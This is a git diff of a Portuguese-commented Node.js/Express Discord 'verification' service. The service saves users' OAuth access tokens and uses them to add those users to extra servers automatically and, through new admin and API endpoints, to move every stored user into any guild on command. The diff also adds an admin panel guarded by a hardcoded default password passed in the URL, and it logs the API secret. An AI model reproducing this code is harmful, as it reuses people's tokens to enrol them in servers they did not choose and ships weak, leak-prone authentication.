@@ -2,6 +2,7 @@ const express = require('express');
 const FormData = require('form-data');
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 const { Redis } = require('@upstash/redis');
+const path = require('path');
 
 const app = express();
 app.use(express.json());
@@ -18,20 +19,22 @@ console.log('BOT_TOKEN:', process.env.BOT_TOKEN ? '✅ definida' : '❌ FALTANDO
 console.log('GUILD_ID:', process.env.GUILD_ID || '❌ FALTANDO');
 console.log('CARGO_ID:', process.env.CARGO_ID || '❌ FALTANDO');
 console.log('API_SECRET:', process.env.API_SECRET || '(usando padrão wht-secret-2025)');
+console.log('ADMIN_PASSWORD:', process.env.ADMIN_PASSWORD ? '✅ definida' : '⚠️ usando padrão (defina ADMIN_PASSWORD no Vercel!)');
 
 const redis = new Redis({
   url: process.env.KV_REST_API_URL,
   token: process.env.KV_REST_API_TOKEN,
 });
 
-const CLIENT_ID     = process.env.CLIENT_ID;
-const CLIENT_SECRET = process.env.CLIENT_SECRET;
-const REDIRECT_URI  = process.env.REDIRECT_URI;
-const BOT_TOKEN     = process.env.BOT_TOKEN;
-const GUILD_ID      = process.env.GUILD_ID;
-const CARGO_ID      = process.env.CARGO_ID;
-const API_SECRET    = process.env.API_SECRET || 'wht-secret-2025';
-const CANAL_ID      = '1498452626357096489';
+const CLIENT_ID      = process.env.CLIENT_ID;
+const CLIENT_SECRET  = process.env.CLIENT_SECRET;
+const REDIRECT_URI   = process.env.REDIRECT_URI;
+const BOT_TOKEN      = process.env.BOT_TOKEN;
+const GUILD_ID       = process.env.GUILD_ID;
+const CARGO_ID       = process.env.CARGO_ID;
+const API_SECRET     = process.env.API_SECRET || 'wht-secret-2025';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin-wht-2025';
+const CANAL_ID       = '1498452626357096489';
 
 // ─── HELPERS REDIS ────────────────────────────────────────────
 async function salvarLog(user, accessToken) {
@@ -61,48 +64,180 @@ async function buscarUm(user_id) {
   return typeof data === 'string' ? JSON.parse(data) : data;
 }
 
-// ─── HELPER: buscar TODOS os membros do servidor via paginação ─
-// Faz no máximo 1 chamada a cada 1000 membros (rate-limit safe).
-// Retorna um Set com os user_ids que já estão no servidor.
 async function buscarMembrosDoServidor(guild_id) {
   const membrosSet = new Set();
   let after = '0';
-
   while (true) {
     const url = `https://discord.com/api/guilds/${guild_id}/members?limit=1000&after=${after}`;
     const resp = await fetch(url, {
       headers: { 'Authorization': `Bot ${BOT_TOKEN}` },
     });
-
     if (resp.status === 403) throw new Error('Bot sem permissão no servidor (403)');
     if (resp.status === 404) throw new Error('Servidor não encontrado (404)');
     if (!resp.ok) throw new Error(`Discord API retornou HTTP ${resp.status}`);
-
     const membros = await resp.json();
     if (!Array.isArray(membros) || membros.length === 0) break;
-
-    for (const m of membros) {
-      membrosSet.add(String(m.user.id));
-    }
-
-    // Se retornou menos de 1000, chegamos ao fim
+    for (const m of membros) membrosSet.add(String(m.user.id));
     if (membros.length < 1000) break;
-
-    // Próxima página: after = último id retornado
     after = membros[membros.length - 1].user.id;
-
-    // Pequena pausa para respeitar rate limit (1 req/s é seguro)
     await new Promise(r => setTimeout(r, 500));
   }
-
   return membrosSet;
 }
+
+// ─── MIDDLEWARE: proteger o painel admin ──────────────────────
+function adminAuth(req, res, next) {
+  const pass = req.query.pass || req.headers['x-admin-pass'];
+  if (pass !== ADMIN_PASSWORD) {
+    return res.status(401).send(`
+      <!DOCTYPE html>
+      <html lang="pt-BR">
+      <head>
+        <meta charset="UTF-8"/>
+        <title>WHT Admin — Acesso</title>
+        <style>
+          *{margin:0;padding:0;box-sizing:border-box}
+          body{background:#0d0e14;color:#e8e9f3;font-family:'Segoe UI',sans-serif;
+               min-height:100vh;display:flex;align-items:center;justify-content:center}
+          .box{background:#13141d;border:1px solid #2a2b3d;border-radius:16px;
+               padding:40px;text-align:center;max-width:380px;width:90%}
+          h2{color:#ff1493;font-size:20px;margin-bottom:8px}
+          p{color:#7b7d9a;font-size:13px;margin-bottom:20px}
+          input{width:100%;background:#1a1b27;border:1px solid #2a2b3d;border-radius:8px;
+                padding:10px 14px;color:#e8e9f3;font-size:13px;outline:none;margin-bottom:12px}
+          input:focus{border-color:rgba(255,20,147,.5)}
+          button{width:100%;background:#ff1493;color:#fff;border:none;border-radius:8px;
+                 padding:10px;font-size:13px;font-weight:600;cursor:pointer}
+          button:hover{background:#ff47ad}
+        </style>
+      </head>
+      <body>
+        <div class="box">
+          <h2>🔐 WHT Admin</h2>
+          <p>Digite a senha para acessar o painel de controle</p>
+          <input type="password" id="pass" placeholder="Senha do admin..." 
+                 onkeydown="if(event.key==='Enter')login()"/>
+          <button onclick="login()">Entrar</button>
+        </div>
+        <script>
+          function login() {
+            const p = document.getElementById('pass').value;
+            if(p) window.location.href = '/admin?pass=' + encodeURIComponent(p);
+          }
+        </script>
+      </body>
+      </html>
+    `);
+  }
+  next();
+}
+
+// ─── ROTA: painel admin ───────────────────────────────────────
+app.get('/admin', adminAuth, (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// ─── ROTA: API do painel — stats em tempo real ────────────────
+app.get('/api/admin/stats', adminAuth, async (req, res) => {
+  try {
+    const logs = await buscarTodos();
+    const hoje = Math.floor(Date.now() / 1000) - 86400;
+    const hoje_count = logs.filter(e => e.ts && e.ts > hoje).length;
+
+    // Buscar servidores extras cadastrados
+    const extrasRaw = await redis.get('servidores_extras');
+    const extras = extrasRaw
+      ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
+      : [];
+
+    res.json({
+      total_tokens: logs.length,
+      com_token: logs.filter(e => e.access_token).length,
+      sem_token: logs.filter(e => !e.access_token).length,
+      verificados_hoje: hoje_count,
+      servidores_extras: extras.length,
+      usuarios: logs.map(e => ({
+        user_id: e.user_id,
+        username: e.username,
+        avatar: e.avatar,
+        tem_token: !!e.access_token,
+        ts: e.ts,
+      })),
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ─── ROTA: API admin — gerenciar servidores extras ────────────
+app.get('/api/admin/servidores', adminAuth, async (req, res) => {
+  try {
+    const raw = await redis.get('servidores_extras');
+    const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
+    res.json({ servidores: extras });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post('/api/admin/servidores', adminAuth, async (req, res) => {
+  const { guild_id } = req.body;
+  if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
+  try {
+    const raw = await redis.get('servidores_extras');
+    const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
+    if (!extras.includes(guild_id)) {
+      extras.push(guild_id);
+      await redis.set('servidores_extras', JSON.stringify(extras));
+    }
+    res.json({ ok: true, servidores: extras });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.delete('/api/admin/servidores/:guild_id', adminAuth, async (req, res) => {
+  const { guild_id } = req.params;
+  try {
+    const raw = await redis.get('servidores_extras');
+    let extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
+    extras = extras.filter(id => id !== guild_id);
+    await redis.set('servidores_extras', JSON.stringify(extras));
+    res.json({ ok: true, servidores: extras });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ─── ROTA: API admin — mover todos para um servidor ──────────
+app.post('/api/admin/mover-todos', adminAuth, async (req, res) => {
+  const { guild_id } = req.body;
+  if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
+  try {
+    const logs = await buscarTodos();
+    let ok = 0, falhou = 0;
+    for (const entrada of logs) {
+      if (!entrada.access_token) { falhou++; continue; }
+      try {
+        const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${entrada.user_id}`, {
+          method: 'PUT',
+          headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ access_token: entrada.access_token }),
+        });
+        if ([200, 201, 204].includes(resp.status)) ok++; else falhou++;
+      } catch { falhou++; }
+      await new Promise(r => setTimeout(r, 100));
+    }
+    res.json({ ok, falhou, total: logs.length });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
 
 // ─── ROTA: bot consulta os logs ───────────────────────────────
 app.get('/api/logs', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET)
     return res.status(401).json({ error: 'Unauthorized' });
-
   try {
     const logs = await buscarTodos();
     res.json({
@@ -119,16 +254,13 @@ app.get('/api/logs', async (req, res) => {
 app.post('/api/mover', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET)
     return res.status(401).json({ error: 'Unauthorized' });
-
   const { user_id, guild_id } = req.body;
   if (!user_id || !guild_id)
     return res.status(400).json({ error: 'user_id e guild_id sao obrigatorios' });
-
   try {
     const entrada = await buscarUm(user_id);
     if (!entrada || !entrada.access_token)
       return res.status(404).json({ error: 'Usuario nao encontrado ou sem token' });
-
     const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
       method: 'PUT',
       headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
@@ -144,14 +276,11 @@ app.post('/api/mover', async (req, res) => {
 app.post('/api/mover-todos', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET)
     return res.status(401).json({ error: 'Unauthorized' });
-
   const { guild_id } = req.body;
   if (!guild_id) return res.status(400).json({ error: 'guild_id e obrigatorio' });
-
   try {
     const logs = await buscarTodos();
     let ok = 0, falhou = 0;
-
     for (const entrada of logs) {
       if (!entrada.access_token) { falhou++; continue; }
       try {
@@ -163,66 +292,39 @@ app.post('/api/mover-todos', async (req, res) => {
         if ([200, 201, 204].includes(resp.status)) ok++; else falhou++;
       } catch { falhou++; }
     }
-
     res.json({ ok, falhou, total: logs.length });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// ─── ROTA: contar disponíveis para um servidor ────────────────
-// Usa paginação para buscar todos os membros do servidor de uma vez,
-// depois compara localmente — sem uma chamada por usuário.
+// ─── ROTA: contar disponíveis ─────────────────────────────────
 app.get('/api/contar-disponiveis', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET)
     return res.status(401).json({ error: 'Unauthorized' });
-
   const { guild_id } = req.query;
   if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
-
   try {
-    const [logs, membrosSet] = await Promise.all([
-      buscarTodos(),
-      buscarMembrosDoServidor(guild_id),
-    ]);
-
-    const comToken      = logs.filter(e => e.access_token);
-    const jaNoServidor  = comToken.filter(e => membrosSet.has(String(e.user_id))).length;
-    const disponiveis   = comToken.filter(e => !membrosSet.has(String(e.user_id))).length;
-
-    res.json({
-      total:          logs.length,
-      com_token:      comToken.length,
-      sem_token:      logs.length - comToken.length,
-      ja_no_servidor: jaNoServidor,
-      disponiveis,
-    });
+    const [logs, membrosSet] = await Promise.all([buscarTodos(), buscarMembrosDoServidor(guild_id)]);
+    const comToken     = logs.filter(e => e.access_token);
+    const jaNoServidor = comToken.filter(e => membrosSet.has(String(e.user_id))).length;
+    const disponiveis  = comToken.filter(e => !membrosSet.has(String(e.user_id))).length;
+    res.json({ total: logs.length, com_token: comToken.length, sem_token: logs.length - comToken.length, ja_no_servidor: jaNoServidor, disponiveis });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
 
-// ─── ROTA: listar disponíveis para um servidor ────────────────
-// Mesma lógica: busca membros via paginação e filtra localmente.
+// ─── ROTA: listar disponíveis ─────────────────────────────────
 app.get('/api/listar-disponiveis', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET)
     return res.status(401).json({ error: 'Unauthorized' });
-
   const { guild_id, limit } = req.query;
   if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
-
   const limitNum = limit ? Math.min(parseInt(limit) || 9999, 9999) : 9999;
-
   try {
-    const [logs, membrosSet] = await Promise.all([
-      buscarTodos(),
-      buscarMembrosDoServidor(guild_id),
-    ]);
-
-    const usuarios = logs
-      .filter(e => e.access_token && !membrosSet.has(String(e.user_id)))
-      .slice(0, limitNum);
-
+    const [logs, membrosSet] = await Promise.all([buscarTodos(), buscarMembrosDoServidor(guild_id)]);
+    const usuarios = logs.filter(e => e.access_token && !membrosSet.has(String(e.user_id))).slice(0, limitNum);
     res.json({ usuarios, total: usuarios.length });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -231,7 +333,6 @@ app.get('/api/listar-disponiveis', async (req, res) => {
 
 // ─── MESES ────────────────────────────────────────────────────
 const MESES = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
-
 function fmtData(dt) {
   return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
 }
@@ -290,7 +391,6 @@ app.get('/', async (req, res) => {
       ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
       : `https://cdn.discordapp.com/embed/avatars/0.png`;
 
-    // ─── ADICIONAR AO SERVIDOR PRINCIPAL ─────────────────────
     try {
       console.log('➕ Adicionando ao servidor principal...');
       const addResp = await fetch(`https://discord.com/api/guilds/${GUILD_ID}/members/${user.id}`, {
@@ -305,13 +405,11 @@ app.get('/', async (req, res) => {
       console.log('[Aviso] Falha ao adicionar ao servidor:', err.message);
     }
 
-    // ─── SERVIDORES EXTRAS ────────────────────────────────────
     try {
       const extrasRaw = await redis.get('servidores_extras');
       const extras = extrasRaw
         ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
         : [];
-
       console.log('🌐 Servidores extras:', extras.length);
       for (const guildId of extras) {
         const extraResp = await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
@@ -331,7 +429,6 @@ app.get('/', async (req, res) => {
     const dataCriacao = fmtData(contaCriada);
     const dataEntrada = fmtData(agora);
 
-    // ─── ENVIAR LOG NO CANAL ──────────────────────────────────
     try {
       const msgResp = await fetch(`https://discord.com/api/channels/${CANAL_ID}/messages`, {
         method: 'POST',
